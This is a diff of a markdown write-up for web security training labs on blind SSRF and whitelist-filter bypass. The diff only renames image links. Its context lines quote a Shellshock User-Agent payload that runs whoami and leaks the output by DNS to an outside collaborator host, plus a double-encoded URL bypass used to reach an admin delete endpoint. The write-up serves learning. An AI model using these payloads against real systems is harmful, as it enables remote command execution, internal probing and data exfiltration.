@@ -357,7 +357,7 @@ When looking at the website the Collaborator Everywhere extension found two conc
 
 The first thing is Referer which indicate Blind SSRF and second is user agent which might be vulnerable to the ShellShock exploit.
 
-![[Pasted image 20260904093845.png]]
+![[1.png]]
 
 We use a basic shellshock exploit to find the user and in the referer we use intruder to find the username.
 
@@ -368,9 +368,9 @@ User-Agent: () { :; }; /usr/bin/nslookup $(whoami).oum8yyrum1ube4w2youh099m8de42
 ```
 
 Then acccording to the context given by the lab we knew that the internal server is in [http://192.168.0](http://192.168.0).{}:8080/ so we used the intruder to find out which internal sever ip is correct
-![[Pasted image 20260904093936.png]]
+![[2.png]]
 
-![[Pasted image 20260904093956.png]]
+![[3.png]]
 
 ---
 ## Lab: SSRF with whitelist-based input filter
@@ -383,19 +383,19 @@ The developer has deployed an anti-SSRF defense you will need to bypass.
 
 The request we are looking for is the stock change request:
 
-![[Pasted image 20260904094100.png]]
+![[4.png]]
 
 When the stockApi value is changed to anythink but [stock.weliketoshop.net](http://stock.weliketoshop.net/) it shows error. But when we give it username@stock.weliketoshop.net it said cant connect to stock service which showed it tried to parse username too. When we add # before @ it says the URL needs to stock.weliketoshop.net so we try encoding it and it worked while double encoding it.
 
-![[Pasted image 20260904094229.png]]
+![[5.png]]
 
 So for admin we go to /admin
 
-![[Pasted image 20260904094304.png]]
+![[6.png]]
 
 And while navigating through admin page we found /admin/delete?username=carlos
 
-![[Pasted image 20260904094342.png]]
+![[7.png]]
 
 So this lab is solved.
 
